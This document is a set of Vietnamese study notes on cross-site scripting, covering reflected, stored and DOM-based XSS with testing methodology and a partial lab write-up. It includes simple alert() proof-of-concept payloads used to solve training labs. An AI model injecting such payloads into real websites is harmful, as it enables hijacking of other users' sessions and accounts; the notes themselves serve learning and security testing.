<!-- TOC -->
## Mục lục

- [Cross-site scripting (XSS)](#cross-site-scripting-xss)
  - [XSS hoạt động như nào ?](#xss-hoạt-động-như-nào-)
  - [Tác động của XSS](#tác-động-của-xss)
  - [PoC cho XSS](#poc-cho-xss)
  - [Tìm và kiểm thử XSS](#tìm-và-kiểm-thử-xss)
  - [Các loại tấn công XSS](#các-loại-tấn-công-xss)
    - [Reflected XSS](#reflected-xss)
    - [Stored XSS](#stored-xss)
    - [DOM-based XSS](#dom-based-xss)
- [WU - XSS](#wu---xss)
  - [Reflected XSS into HTML context with nothing encoded](#reflected-xss-into-html-context-with-nothing-encoded)
  - [Stored XSS into HTML context with nothing encoded](#stored-xss-into-html-context-with-nothing-encoded)
  - [DOM XSS in `document.write` sink using source `location.search`](#dom-xss-in-documentwrite-sink-using-source-locationsearch)
  - [DOM XSS in `innerHTML` sink using source `location.search`](#dom-xss-in innerhtml sink-using-source locationsearch)
  - [DOM XSS in jQuery anchor `href` attribute sink using `location.search` source](#dom-xss-in-jquery-anchor href attribute-sink-using locationsearch source)
  - [DOM XSS in jQuery selector sink using a hashchange event](#dom-xss-in-jquery-selector-sink-using-a-hashchange-event)
  - [Reflected XSS into attribute with angle brackets HTML-encoded](#reflected-xss-into-attribute-with-angle-brackets-html-encoded)
  - [Stored XSS into anchor `href` attribute with double quotes HTML-encoded](#stored-xss-into-anchor href attribute-with-double-quotes-html-encoded)
  - [Reflected XSS into a JavaScript string with angle brackets HTML encoded](#reflected-xss-into-a-javascript-string-with-angle-brackets-html-encoded)
  - [DOM XSS in `document.write` sink using source `location.search` inside a select element](#dom-xss-in documentwrite sink-using-source locationsearch inside-a-select-element)
  - [DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded](#dom-xss-in-angularjs-expression-with-angle-brackets-and-double-quotes-html-encoded)
  - [Reflected DOM XSS](#reflected-dom-xss)
  - [Stored DOM XSS](#stored-dom-xss)
  - [Reflected XSS into HTML context with most tags and attributes blocked](#reflected-xss-into-html-context-with-most-tags-and-attributes-blocked)
  - [Reflected XSS into HTML context with all tags blocked except custom ones](#reflected-xss-into-html-context-with-all-tags-blocked-except-custom-ones)
  - [Reflected XSS with some SVG markup allowed](#reflected-xss-with-some-svg-markup-allowed)
  - [Reflected XSS in canonical link tag](#reflected-xss-in-canonical-link-tag)
  - [Reflected XSS into a JavaScript string with single quote and backslash escaped](#reflected-xss-into-a-javascript-string-with-single-quote-and-backslash-escaped)
  - [Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped](#reflected-xss-into-a-javascript-string-with-angle-brackets-and-double-quotes-html-encoded-and-single-quotes-escaped)
  - [Stored XSS into `onclick` event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped](#stored-xss-into onclick event-with-angle-brackets-and-double-quotes-html-encoded-and-single-quotes-and-backslash-escaped)
  - [Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped](#reflected-xss-into-a-template-literal-with-angle-brackets-single-double-quotes-backslash-and-backticks-unicode-escaped)
  - [Exploiting cross-site scripting to steal cookies](#exploiting-cross-site-scripting-to-steal-cookies)
  - [Exploiting cross-site scripting to capture passwords](#exploiting-cross-site-scripting-to-capture-passwords)
  - [Exploiting XSS to bypass CSRF defenses](#exploiting-xss-to-bypass-csrf-defenses)
  - [Reflected XSS with AngularJS sandbox escape without strings](#reflected-xss-with-angularjs-sandbox-escape-without-strings)
  - [Reflected XSS in a JavaScript URL with some characters blocked](#reflected-xss-in-a-javascript-url-with-some-characters-blocked)
  - [Reflected XSS with AngularJS sandbox escape and CSP](#reflected-xss-with-angularjs-sandbox-escape-and-csp)
  - [Reflected XSS with event handlers and `href` attributes blocked](#reflected-xss-with-event-handlers-and href attributes-blocked)
  - [Reflected XSS protected by CSP, with CSP bypass](#reflected-xss-protected-by-csp-with-csp-bypass)
  - [Reflected XSS protected by very strict CSP, with dangling markup attack](#reflected-xss-protected-by-very-strict-csp-with-dangling-markup-attack)
<!-- /TOC -->
# Cross-site scripting (XSS)

Cross-site scripting (còn được gọi là XSS) là một lỗ hổng bảo mật web cho phép kẻ tấn công can thiệp vào các tương tác mà người dùng thực hiện với một ứng dụng dễ bị tấn công. Nó cho phép kẻ tấn công vượt qua chính sách cùng nguồn gốc (same origin policy), vốn được thiết kế để tách biệt các website khác nhau.

Các lỗ hổng cross-site scripting thường cho phép kẻ tấn công giả mạo người dùng nạn nhân, thực hiện bất kỳ hành động nào mà người dùng có thể làm, và truy cập bất kỳ dữ liệu nào của người dùng. Nếu người dùng nạn nhân có quyền truy cập đặc quyền trong ứng dụng, kẻ tấn công thậm chí có thể chiếm quyền kiểm soát hoàn toàn toàn bộ chức năng và dữ liệu của ứng dụng. 

## XSS hoạt động như nào ?
Cross-site scripting hoạt động bằng cách lợi dụng một website có lỗ hổng để nó trả về mã JavaScript độc hại cho người dùng. Khi đoạn mã độc này được thực thi bên trong trình duyệt của nạn nhân, kẻ tấn công có thể chiếm toàn bộ quyền kiểm soát các tương tác của người dùng với ứng dụng.
![](../../image/Pasted%20image%2020260415201621.png)
## Tác động của XSS
Tác động thực tế của một cuộc tấn công XSS thường phụ thuộc vào bản chất của ứng dụng, chức năng và dữ liệu của nó, cũng như quyền hạn của người dùng bị xâm phạm. Ví dụ:

- Trong một ứng dụng dạng _brochureware_, nơi tất cả người dùng đều ẩn danh và toàn bộ thông tin đều công khai, tác động thường là tối thiểu.
- Trong một ứng dụng lưu trữ dữ liệu nhạy cảm, như giao dịch ngân hàng, email hoặc hồ sơ y tế, tác động thường sẽ nghiêm trọng.
- Nếu người dùng bị xâm phạm có quyền nâng cao trong ứng dụng, thì tác động nhìn chung sẽ là **nghiêm trọng**, cho phép kẻ tấn công chiếm toàn bộ quyền kiểm soát ứng dụng dễ bị tấn công và làm ảnh hưởng đến tất cả người dùng cùng dữ liệu của họ.

## PoC cho XSS
Bạn có thể xác nhận hầu hết các loại lỗ hổng XSS bằng cách chèn một payload khiến trình duyệt của chính bạn thực thi một đoạn JavaScript tùy ý. Lâu nay, việc sử dụng hàm `alert()` cho mục đích này đã trở thành thông lệ phổ biến vì nó ngắn gọn, vô hại và rất dễ nhận thấy khi được gọi thành công. Thực tế, bạn sẽ giải quyết phần lớn các lab XSS bằng cách gọi `alert()` trong trình duyệt của nạn nhân giả lập.

Tuy nhiên, có một trở ngại nhỏ khi bạn dùng Chrome. Từ phiên bản 92 (20/07/2021), các iframe cross-origin bị chặn không cho gọi `alert()`. Vì iframe cross-origin thường được sử dụng để xây dựng một số kiểu tấn công XSS nâng cao, đôi khi bạn sẽ cần dùng payload PoC thay thế. Trong trường hợp này, chúng tôi khuyến nghị sử dụng hàm `print()`. Nếu bạn quan tâm đến việc tìm hiểu thêm về thay đổi này và lý do chúng tôi ưa thích `print()`, hãy xem bài blog của chúng tôi về chủ đề này.

Vì trong các lab, nạn nhân giả lập sử dụng Chrome, chúng tôi đã chỉnh sửa những lab bị ảnh hưởng để cũng có thể giải bằng cách dùng `print()`. Điều này được chỉ rõ trong phần hướng dẫn ở những lab liên quan.
## Tìm và kiểm thử XSS
Phần lớn các lỗ hổng XSS có thể được phát hiện nhanh chóng và đáng tin cậy bằng cách sử dụng **trình quét lỗ hổng web của Burp Suite**.

Việc kiểm thử thủ công đối với **reflected XSS** và **stored XSS** thường bao gồm các bước:

- Gửi một số đầu vào đơn giản, duy nhất (ví dụ: một chuỗi chữ và số ngắn) vào mọi điểm nhập liệu trong ứng dụng.
- Xác định mọi vị trí mà dữ liệu đã nhập được phản hồi trong các phản hồi HTTP.
- Kiểm thử từng vị trí riêng lẻ để xem liệu dữ liệu được tạo thủ công có thể được dùng để thực thi JavaScript tùy ý hay không.

Bằng cách này, bạn có thể xác định **ngữ cảnh (context)** mà XSS xảy ra và chọn payload phù hợp để khai thác nó.

Việc kiểm thử thủ công **DOM-based XSS** phát sinh từ tham số URL cũng tương tự:

- Đặt một chuỗi dữ liệu đơn giản, duy nhất vào tham số.
- Sử dụng công cụ dành cho nhà phát triển (developer tools) của trình duyệt để tìm chuỗi đó trong DOM.
- Kiểm thử từng vị trí để xác định xem nó có thể khai thác được không.

Tuy nhiên, các loại DOM XSS khác thì khó phát hiện hơn. Để tìm các lỗ hổng DOM dựa trên:

- **nguồn không phải URL** (như `document.cookie`), hoặc
- **sink không phải HTML** (như `setTimeout`),

thì không có cách nào khác ngoài việc **xem xét mã JavaScript trực tiếp**, điều này có thể tốn rất nhiều thời gian.

Trình quét lỗ hổng web của Burp Suite kết hợp **phân tích tĩnh (static)** và **phân tích động (dynamic)** đối với JavaScript để tự động phát hiện các lỗ hổng DOM-based một cách đáng tin cậy.

## Các loại tấn công XSS
### Reflected XSS
Còn gọi là XSS phản chiếu, xuất hiện khi 1 ứng dụng nhận dữ liệu trong 1 HTTP request và chèn dữ liệu đó trực tiếp vào response ngay lập tức theo cách ko an toàn.
Ví dụ, giả sử 1 website có chức năng tìm kiếm, nhận từ khóa do người dùng nhập qua tham số URL: `https://insecure-website.com/search?term=gift`
Ứng dụng sẽ phản hồi bằng cách hiển thị lại từ khóa tìm kiếm trong trang kết quả:
`<p>You searched for: gift</p>`
Nếu ứng dụng ko xử lí thêm dữ liệu này, attacker có thể tạo 1 URL tấn công như sau:
`https://insecure-website.com/search?term=<script>/*+Bad+stuff+here...+*/</script>`
Khi đó, response trả về sẽ trở thành:
`<p>You searched for: <script>/* Bad stuff here... */</script></p>`

Nếu một người dùng khác truy cập URL do kẻ tấn công cung cấp, đoạn script chèn vào sẽ được thực thi trong trình duyệt của nạn nhân, trong ngữ cảnh phiên làm việc (session context) của họ với ứng dụng.

- **TÁC ĐỘNG**
Nếu kẻ tấn công có thể kiểm soát một đoạn script được thực thi trong trình duyệt của nạn nhân, thì chúng thường có khả năng chiếm quyền kiểm soát hoàn toàn tài khoản của người dùng đó. Cụ thể, kẻ tấn công có thể:

- Thực hiện bất kỳ hành động nào trong ứng dụng mà người dùng có thể thực hiện.
- Xem bất kỳ thông tin nào mà người dùng có quyền xem.
- Sửa đổi bất kỳ thông tin nào mà người dùng có quyền chỉnh sửa.
- Khởi tạo tương tác với những người dùng khác của ứng dụng, bao gồm cả các cuộc tấn công độc hại, và khiến chúng trông như xuất phát từ người dùng nạn nhân ban đầu.

Có nhiều cách để kẻ tấn công lừa nạn nhân gửi một request do chúng kiểm soát nhằm triển khai tấn công reflected XSS, chẳng hạn như:

- Đặt liên kết độc hại trên một website do kẻ tấn công quản lý.
- Đặt liên kết trên một website khác cho phép người dùng tự tạo nội dung.
- Gửi liên kết qua email, tweet hoặc tin nhắn.

Cuộc tấn công có thể nhắm trực tiếp vào một người dùng cụ thể, hoặc thực hiện ngẫu nhiên với bất kỳ người dùng nào của ứng dụng.

Vì cần một **cơ chế truyền tải bên ngoài** để thực hiện, tác động của **reflected XSS** nhìn chung ít nghiêm trọng hơn so với **stored XSS**, nơi mà tấn công có thể tự tồn tại và thực thi hoàn toàn bên trong ứng dụng dễ bị tấn công.
- **NGỮ CẢNH**
Có rất nhiều biến thể khác nhau của reflected cross-site scripting. **Vị trí mà dữ liệu được phản chiếu (reflected) trong response của ứng dụng** sẽ quyết định loại payload cần sử dụng để khai thác, đồng thời cũng có thể ảnh hưởng đến mức độ tác động của lỗ hổng.

Ngoài ra, nếu ứng dụng thực hiện bất kỳ quá trình kiểm tra hợp lệ (validation) hoặc xử lý dữ liệu nào trước khi phản chiếu lại, thì điều này cũng sẽ ảnh hưởng đến loại payload XSS cần được sử dụng.
- **TÌM VÀ KIỂM THỬ**
Phần lớn các lỗ hổng reflected cross-site scripting có thể được phát hiện nhanh chóng và đáng tin cậy bằng cách sử dụng **trình quét lỗ hổng web của Burp Suite**.

Việc kiểm thử thủ công lỗ hổng reflected XSS bao gồm các bước sau:

- **Kiểm thử mọi điểm nhập liệu:** Kiểm thử riêng biệt từng điểm nhập liệu cho dữ liệu trong HTTP request của ứng dụng. Điều này bao gồm các tham số hoặc dữ liệu khác trong query string của URL và message body, cũng như đường dẫn file trong URL. Nó cũng bao gồm cả các HTTP header, mặc dù hành vi giống XSS chỉ có thể được kích hoạt thông qua một số header nhất định thường sẽ không khai thác được trong thực tế.
- **Gửi giá trị chữ và số ngẫu nhiên:** Với mỗi điểm nhập liệu, gửi một giá trị ngẫu nhiên duy nhất và xác định xem giá trị đó có được phản chiếu trong response hay không. Giá trị nên được thiết kế để vượt qua hầu hết các kiểm tra đầu vào, vì vậy nó cần đủ ngắn gọn và chỉ bao gồm ký tự chữ và số. Nhưng cũng phải đủ dài để khả năng trùng hợp ngẫu nhiên trong response là rất thấp. Thông thường, một chuỗi chữ và số ngẫu nhiên khoảng 8 ký tự là lý tưởng. Bạn có thể dùng Burp Intruder với payload kiểu số được sinh ngẫu nhiên ở dạng hex để tạo ra giá trị ngẫu nhiên phù hợp. Đồng thời có thể sử dụng thiết lập grep payload của Burp Intruder để tự động đánh dấu các response chứa giá trị đã gửi.
- **Xác định ngữ cảnh phản chiếu:** Với mỗi vị trí trong response nơi giá trị ngẫu nhiên được phản chiếu, hãy xác định ngữ cảnh của nó. Nó có thể nằm trong văn bản giữa các thẻ HTML, trong thuộc tính của thẻ (có thể được đặt trong dấu nháy), trong một chuỗi JavaScript, v.v.
- **Kiểm thử payload thử nghiệm:** Dựa trên ngữ cảnh phản chiếu, kiểm thử một payload XSS ban đầu có thể kích hoạt thực thi JavaScript nếu nó được phản chiếu nguyên vẹn trong response. Cách dễ nhất để kiểm thử payload là gửi request sang Burp Repeater, chỉnh sửa request để chèn payload thử nghiệm, gửi request và xem xét response để xác định payload có hoạt động hay không. Một cách làm hiệu quả là giữ nguyên giá trị ngẫu nhiên gốc trong request và chèn payload XSS trước hoặc sau nó. Sau đó đặt giá trị ngẫu nhiên làm từ khóa tìm kiếm trong giao diện response của Burp Repeater. Burp sẽ đánh dấu mọi vị trí xuất hiện, cho phép bạn nhanh chóng xác định chỗ phản chiếu.
- **Kiểm thử payload thay thế:** Nếu payload thử nghiệm bị ứng dụng sửa đổi hoặc chặn hoàn toàn, bạn sẽ cần thử các payload và kỹ thuật thay thế có thể mang lại một cuộc tấn công XSS thành công, dựa trên ngữ cảnh phản chiếu và loại kiểm tra đầu vào đang được áp dụng.
- **Kiểm thử tấn công trong trình duyệt:** Cuối cùng, nếu bạn tìm được payload hoạt động trong Burp Repeater, hãy chuyển sang kiểm thử trong một trình duyệt thực (bằng cách dán URL vào thanh địa chỉ hoặc chỉnh sửa request trong Burp Proxy ở chế độ intercept) và xem liệu JavaScript được chèn có thực sự thực thi hay không. Thông thường, cách tốt nhất là chạy một đoạn JavaScript đơn giản như `alert(document.domain)` để hiện ra một popup trong trình duyệt nếu tấn công thành công.
- **FAQs**
**Sự khác biệt giữa reflected XSS và stored XSS là gì?**

Reflected XSS xảy ra khi một ứng dụng nhận dữ liệu từ HTTP request và nhúng dữ liệu đó trực tiếp vào response ngay lập tức theo cách không an toàn. Với stored XSS, ứng dụng sẽ lưu trữ dữ liệu đầu vào và nhúng nó vào một response về sau theo cách không an toàn.

**Sự khác biệt giữa reflected XSS và self-XSS là gì?**

Self-XSS có hành vi ứng dụng tương tự như reflected XSS thông thường, tuy nhiên nó không thể được kích hoạt theo cách bình thường bằng một URL được tạo thủ công hoặc một request cross-domain. Thay vào đó, lỗ hổng chỉ bị khai thác nếu chính nạn nhân tự mình nhập payload XSS vào trình duyệt. Việc triển khai một cuộc tấn công self-XSS thường liên quan đến **kỹ nghệ xã hội (social engineering)** để dụ nạn nhân dán đoạn dữ liệu do kẻ tấn công cung cấp vào trình duyệt của họ. Do đó, self-XSS thường được coi là một vấn đề yếu, có mức độ ảnh hưởng thấp.

### Stored XSS
Stored cross-site scripting (còn được gọi là **second-order XSS** hoặc **persistent XSS**) xảy ra khi một ứng dụng nhận dữ liệu từ một nguồn không đáng tin cậy và sau đó nhúng dữ liệu đó vào các HTTP response về sau theo cách không an toàn.

Ví dụ, giả sử một website cho phép người dùng gửi bình luận trên các bài blog, và những bình luận này sẽ được hiển thị cho người dùng khác. Người dùng gửi bình luận bằng một HTTP request như sau:
```
POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Length: 100

postId=3&comment=This+post+was+extremely+helpful.&name=Carlos+Montoya&email=carlos%40normal-user.net
```
Sau khi comment này đc gửi đi, ai truy cập bài viết đều nhận được response chứa nội dung:
`<p>This post was extremely helpful.</p>`

Nếu ứng dụng ko xử lí dữ liệu này, attacker có thể gửi một bình luận độc hại như sau
`<script>/* Bad stuff here... */</script>`

Trong request của kẻ tấn công, bình luận này sẽ đc URL-encode thành:
`comment=%3Cscript%3E%2F*%2BBad%2Bstuff%2Bhere...%2B*%2F%3C%2Fscript%3E`

Khi đó bất kì ai truy cập blog sẽ nhận được response:
`<p><script>/* Bad stuff here... */</script></p>`

Và đoạn script do kẻ tấn công chèn vào sẽ được thực thi trong trình duyệt của nạn nhân, trong session context của họ với ứng dụng

- **TÁC ĐỘNG**:
Nếu kẻ tấn công có thể kiểm soát một đoạn script được thực thi trong trình duyệt của nạn nhân, thì chúng thường có khả năng chiếm quyền kiểm soát hoàn toàn tài khoản của người dùng đó. Kẻ tấn công có thể thực hiện bất kỳ hành động nào liên quan đến tác động của lỗ hổng reflected XSS.

Về khả năng khai thác, sự khác biệt chính giữa reflected XSS và stored XSS là: **stored XSS cho phép tấn công tồn tại ngay bên trong ứng dụng**. Kẻ tấn công không cần tìm cách bên ngoài để dụ người dùng gửi request chứa payload khai thác. Thay vào đó, chúng chỉ cần chèn exploit trực tiếp vào ứng dụng và chờ người dùng truy cập để kích hoạt.

Tính chất “tự tồn tại” (self-contained) của stored XSS đặc biệt quan trọng trong những tình huống mà lỗ hổng XSS chỉ ảnh hưởng đến người dùng đang đăng nhập. Với reflected XSS, cuộc tấn công phải được **thời gian hóa chính xác**: nếu người dùng truy cập URL độc hại khi chưa đăng nhập thì họ sẽ không bị ảnh hưởng. Ngược lại, với stored XSS, người dùng chắc chắn sẽ đang đăng nhập vào lúc họ tương tác với payload độc hại.

- **NGỮ CẢNH**
Có rất nhiều biến thể khác nhau của stored cross-site scripting. Vị trí mà dữ liệu được lưu trữ và sau đó hiển thị trong response của ứng dụng sẽ quyết định loại payload cần được sử dụng để khai thác, đồng thời cũng có thể ảnh hưởng đến mức độ tác động của lỗ hổng.

Ngoài ra, nếu ứng dụng thực hiện bất kỳ quá trình **kiểm tra hợp lệ (validation)** hoặc xử lý dữ liệu nào trước khi lưu trữ, hoặc tại thời điểm dữ liệu được chèn vào response, thì điều này cũng sẽ ảnh hưởng đến loại payload XSS cần được sử dụng.
- **TÌM VÀ KIỂM THỬ**
Nhiều lỗ hổng stored XSS có thể được phát hiện bằng **trình quét lỗ hổng web của Burp Suite**.

Kiểm thử thủ công đối với stored XSS có thể thách thức. Bạn cần kiểm thử tất cả các “điểm vào” (entry point) liên quan mà qua đó dữ liệu do kẻ tấn công kiểm soát có thể đi vào quá trình xử lý của ứng dụng, và tất cả các “điểm ra” (exit point) nơi dữ liệu đó có thể xuất hiện trong các phản hồi của ứng dụng.

**Các điểm vào** vào quá trình xử lý của ứng dụng bao gồm:

- Tham số hoặc dữ liệu khác trong query string của URL và phần thân thông điệp (message body).
- Đường dẫn tệp trong URL.
- Các HTTP request header có thể không khai thác được trong bối cảnh reflected XSS.
- Bất kỳ kênh out-of-band nào qua đó kẻ tấn công có thể đưa dữ liệu vào ứng dụng. Các kênh này phụ thuộc hoàn toàn vào chức năng của ứng dụng: một ứng dụng webmail sẽ xử lý dữ liệu nhận qua email; một ứng dụng hiển thị Twitter feed có thể xử lý dữ liệu trong tweet của bên thứ ba; còn một bộ tổng hợp tin tức sẽ đưa vào dữ liệu có nguồn gốc từ các website khác.

**Các điểm ra** cho tấn công stored XSS là mọi phản hồi HTTP có thể được trả về cho bất kỳ loại người dùng nào của ứng dụng trong bất kỳ tình huống nào.

Bước đầu tiên khi kiểm thử stored XSS là xác định **mối liên kết giữa các điểm vào và điểm ra**, tức là nơi dữ liệu gửi vào một điểm vào sẽ được phát ra từ một điểm ra. Việc này khó vì:

- Dữ liệu gửi vào **bất kỳ** điểm vào nào về nguyên tắc cũng có thể được phát ra từ **bất kỳ** điểm ra nào. Ví dụ, tên hiển thị do người dùng cung cấp có thể xuất hiện trong một nhật ký kiểm toán khó tìm, chỉ hiển thị cho một số người dùng.
- Dữ liệu hiện do ứng dụng lưu trữ thường có thể bị ghi đè bởi các hành động khác trong ứng dụng. Ví dụ, chức năng tìm kiếm có thể hiển thị danh sách tìm kiếm gần đây, nhưng chúng nhanh chóng bị thay thế khi người dùng thực hiện các tìm kiếm mới.
Để nhận diện đầy đủ các liên kết giữa điểm vào và điểm ra, về lý thuyết cần kiểm thử từng hoán vị riêng: gửi một giá trị cụ thể vào điểm vào, điều hướng trực tiếp đến điểm ra và xác định xem giá trị có xuất hiện ở đó không. Tuy nhiên, cách tiếp cận này không thực tế với các ứng dụng có nhiều hơn vài trang.

Thay vào đó, một cách tiếp cận thực tế hơn là làm việc **có hệ thống qua các điểm nhập dữ liệu**, gửi một giá trị cụ thể vào từng điểm và **giám sát các phản hồi** của ứng dụng để phát hiện trường hợp giá trị đã gửi xuất hiện. Cần chú ý đặc biệt đến các chức năng phù hợp của ứng dụng, như phần bình luận bài blog. Khi thấy giá trị đã gửi xuất hiện trong một phản hồi, bạn cần xác định xem dữ liệu thực sự đang được **lưu trữ qua nhiều request khác nhau**, hay chỉ đơn giản là **bị phản chiếu** trong phản hồi ngay lập tức.

Khi bạn đã xác định được các liên kết giữa điểm vào và điểm ra trong quá trình xử lý của ứng dụng, **mỗi liên kết** cần được kiểm thử cụ thể để phát hiện liệu có tồn tại lỗ hổng stored XSS hay không. Điều này bao gồm việc xác định **ngữ cảnh** trong phản hồi nơi dữ liệu được lưu trữ xuất hiện và thử nghiệm các **payload XSS ứng viên** phù hợp với ngữ cảnh đó. Tại thời điểm này, **phương pháp kiểm thử** về cơ bản giống với cách tìm lỗ hổng **reflected XSS**.

### DOM-based XSS
Lỗ hổng DOM-based XSS thường xuất hiện khi JavaScript lấy dữ liệu từ một nguồn có thể bị kẻ tấn công kiểm soát (chẳng hạn như URL) và truyền dữ liệu đó đến một **sink** hỗ trợ thực thi mã động, như `eval()` hoặc `innerHTML`. Điều này cho phép kẻ tấn công thực thi JavaScript độc hại, từ đó thường dẫn đến việc chiếm quyền tài khoản của người dùng khác.

Để triển khai một cuộc tấn công DOM-based XSS, bạn cần chèn dữ liệu vào một **source** sao cho dữ liệu này được truyền tới một **sink** và gây ra việc thực thi JavaScript tùy ý.

Nguồn phổ biến nhất của DOM XSS là **URL**, thường được truy cập thông qua đối tượng `window.location`. Kẻ tấn công có thể tạo một liên kết để dụ nạn nhân truy cập vào một trang dễ bị tấn công, trong đó payload được chèn vào query string hoặc fragment của URL. Trong một số trường hợp, chẳng hạn khi nhắm đến trang 404 hoặc website chạy PHP, payload cũng có thể được đặt trong **đường dẫn (path)**.

- **KIỂM THỬ**:
1. **HTML sinks:**
Để kiểm thử DOM XSS trong một HTML sink, hãy đặt một chuỗi chữ–số ngẫu nhiên vào **source** (chẳng hạn như `location.search`), sau đó dùng công cụ dành cho nhà phát triển để kiểm tra HTML và tìm nơi chuỗi của bạn xuất hiện. Lưu ý rằng tùy chọn “View source” của trình duyệt sẽ không hoạt động cho việc kiểm thử DOM XSS vì nó không tính đến các thay đổi trong HTML do JavaScript thực hiện. Trong công cụ dành cho nhà phát triển của Chrome, bạn có thể dùng Control+F (hoặc Command+F trên macOS) để tìm chuỗi của bạn trong DOM.

Với mỗi vị trí chuỗi của bạn xuất hiện trong DOM, bạn cần xác định **ngữ cảnh**. Dựa trên ngữ cảnh này, bạn cần tinh chỉnh đầu vào để xem nó được xử lý như thế nào. Ví dụ, nếu chuỗi của bạn xuất hiện trong một thuộc tính đặt trong dấu nháy kép, hãy thử chèn dấu nháy kép vào chuỗi của bạn để xem liệu bạn có thể thoát ra khỏi thuộc tính đó hay không.

Lưu ý rằng các trình duyệt có hành vi khác nhau liên quan đến **URL-encoding**: Chrome, Firefox và Safari sẽ URL-encode `location.search` và `location.hash`, trong khi IE11 và Microsoft Edge (tiền Chromium) sẽ **không** URL-encode các nguồn này. Nếu dữ liệu của bạn bị URL-encode trước khi được xử lý, thì một cuộc tấn công XSS khó có thể hoạt động.
	
2. **JavaScript execution sink**
Kiểm thử các JavaScript execution sink cho DOM-based XSS khó hơn một chút. Với các sink này, đầu vào của bạn không nhất thiết sẽ xuất hiện trực tiếp trong DOM, vì vậy bạn không thể chỉ tìm kiếm chuỗi đã chèn. Thay vào đó, bạn cần sử dụng **JavaScript debugger** để xác định liệu và cách dữ liệu đầu vào của bạn được truyền tới sink.

Với mỗi **source** tiềm năng (chẳng hạn như `location`), trước hết bạn cần tìm trong mã JavaScript của trang những vị trí mà source đó được tham chiếu. Trong công cụ dành cho nhà phát triển của Chrome, bạn có thể dùng **Control+Shift+F** (hoặc **Command+Alt+F** trên macOS) để tìm kiếm trong toàn bộ mã JavaScript của trang.

Khi bạn đã tìm thấy nơi source được đọc, bạn có thể sử dụng **JavaScript debugger** để đặt breakpoint và theo dõi cách giá trị của source được xử lý. Bạn có thể thấy rằng source được gán cho các biến khác. Nếu vậy, bạn cần dùng chức năng tìm kiếm một lần nữa để theo dõi các biến này và xem chúng có được truyền đến sink hay không.

Khi bạn phát hiện một sink nhận dữ liệu có nguồn gốc từ source, bạn có thể dùng debugger để kiểm tra giá trị bằng cách di chuột qua biến để xem nội dung của nó trước khi được truyền vào sink. Sau đó, giống như với HTML sink, bạn cần **tinh chỉnh đầu vào** để xem liệu có thể thực hiện thành công một cuộc tấn công XSS hay không.

3. **DOM invader**
Việc xác định và khai thác DOM XSS trong môi trường thực tế có thể là một quá trình tốn công, thường yêu cầu bạn phải thủ công rà soát qua các đoạn JavaScript phức tạp, đã được nén (minified). Tuy nhiên, nếu bạn sử dụng trình duyệt của Burp, bạn có thể tận dụng tiện ích mở rộng tích hợp sẵn là DOM Invader, công cụ này sẽ tự động xử lý phần lớn công việc khó khăn cho bạn.
4. **Khai thác**
Về nguyên tắc, một website sẽ dễ bị tấn công DOM-based cross-site scripting nếu tồn tại một đường thực thi mà dữ liệu có thể truyền từ **source** đến **sink**. Trên thực tế, các source và sink khác nhau có những đặc tính và hành vi khác nhau, ảnh hưởng đến khả năng khai thác và quyết định kỹ thuật nào cần sử dụng. Ngoài ra, script của website có thể thực hiện **kiểm tra hợp lệ (validation)** hoặc xử lý dữ liệu khác, những điều này cũng cần được tính đến khi cố gắng khai thác lỗ hổng.

Có nhiều loại **sink** liên quan đến các lỗ hổng DOM-based. Vui lòng tham khảo danh sách dưới đây để biết chi tiết.

**Sink `document.write`** hoạt động với các phần tử `<script>`, do đó bạn có thể sử dụng một payload đơn giản như sau:
`document.write('... <script>alert(document.domain)</script> ...');`

# WU - XSS

- [x] Reflected XSS into HTML context with nothing encoded
- [x] Stored XSS into HTML context with nothing encoded  
- [x] DOM XSS in document.write sink using source location.search
- [x] DOM XSS in innerHTML sink using source location.search
- [x] DOM XSS in jQuery anchor href attribute sink
- [x] DOM XSS in jQuery selector sink using hashchange event
- [x] Reflected XSS into attribute with angle brackets HTML-encoded
- [x] Stored XSS into anchor href attribute with double quotes HTML-encoded
- [x] Reflected XSS into a JavaScript string with angle brackets HTML-encoded
- [x] DOM XSS in document.write sink using source location.search (inside select)
- [x] DOM XSS in AngularJS expression with angle brackets and double quotes encoded
- [x] Reflected DOM XSS
- [x] Stored DOM XSS
- [x] Exploiting XSS to steal cookies
- [x] Exploiting XSS to capture passwords
- [x] Exploiting XSS to perform CSRF
- [x] Reflected XSS into HTML context with most tags and attributes blocked
- [x] Reflected XSS into HTML context with all tags blocked except custom ones
- [x] Reflected XSS with some SVG markup allowed
- [x] Reflected XSS in canonical link tag
- [x] Reflected XSS into a JavaScript string with single quote and backslash escaped
- [x] Reflected XSS into a JavaScript string with angle brackets and double quotes encoded
- [x] Reflected XSS into a template literal with angle brackets, single/double quotes encoded
- [ ] Reflected XSS with event handlers and href attributes blocked
- [ ] Reflected XSS in a JavaScript URL with some characters blocked
- [x] Stored XSS into onclick event with angle brackets and double quotes HTML-encoded
- [ ] Reflected XSS into a JavaScript string with single quote and backslash escaped (2)
- [ ] Reflected XSS with AngularJS sandbox escape without strings
- [ ] Reflected XSS with AngularJS sandbox escape and CSP
- [ ] Reflected XSS protected by very strict CSP with dangling markup attack
## Reflected XSS into HTML context with nothing encoded
![](../../image/Pasted%20image%2020260415203414.png)
- trang web có lỗ hổng reflected XSS ở phần tìm kiếm
- chèn payload: `<script>alert(1)</script>` để solve lab
![](../../image/Pasted%20image%2020260415203702.png)
![](../../image/Pasted%20image%2020260415203758.png)

## Stored XSS into HTML context with nothing encoded

![](../../image/Pasted%20image%2020260415210311.png)
- vào 1 bài post và xuống phần comment:
![](../../image/Pasted%20image%2020260415220921.png)
- khi quay lại bài blog thì alert đã xuất hiện
![](../../image/Pasted%20image%2020260415221000.png)

## DOM XSS in `document.write` sink using source `location.search`

![](../../image/Pasted%20image%2020260416114314.png)
- untrusted data sẽ đi vào ở source: `location.search`, nó lấy toàn bộ query string trên url và sink: `document.write` sẽ la nơi xử lí, hàm này sẽ ghi trực tiếp nội dung vào tài liệu HTML của web
	- ở trên khi ta nhập minh vào ô search, trên url cũng hiển thị query 
	- khi inspect source code, thấy query lấy trực tiếp giá trị từ tham số trên url và nối chuỗi trực tiếp vào thẻ `img` thông qua `document.write` 
![](../../image/Pasted%20image%2020260416114656.png)


- chèn payload: `"> <script>alert(1)</script>`
![](../../image/Pasted%20image%2020260416115116.png)


